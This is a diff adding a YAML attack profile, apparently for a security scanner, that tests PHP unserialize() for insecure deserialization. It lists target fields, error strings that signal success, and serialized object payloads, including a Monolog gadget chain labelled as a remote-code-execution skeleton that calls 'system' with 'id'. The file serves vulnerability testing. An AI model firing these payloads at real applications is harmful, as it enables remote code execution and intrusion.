@@ -1,0 +1,26 @@
+# Insecure Deserialization Attack Profile for PHP
+name: "PHP Deserialization"
+category: "deserialization"
+severity: "critical"
+description: "Tests for insecure deserialization vulnerabilities in PHP unserialize(), including object injection"
+supported_languages:
+  - "php"
+target_fields:
+  - "serialized"
+  - "php_serial"
+  - "php_obj"
+  - "php_sess_id"
+  - "phar"
+success_indicators:
+  - "PHP Fatal error: Uncaught"
+  - "Object of class"
+  - "unserialize(): Error"
+  - "__wakeup()"
+  - "__destruct()"
+payloads:
+  - 'O:8:"Exploit":1:{s:7:"command";s:2:"id";}'
+  - 'O:4:"User":1:{s:4:"name";s:5:"admin";}'
+  # Array wrapper bypass
+  - 'a:2:{i:0;O:8:"Exploit":0:{}i:1;s:4:"test";}'
+  # Monolog RCE skeleton
+  - 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"*handler";N;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}'
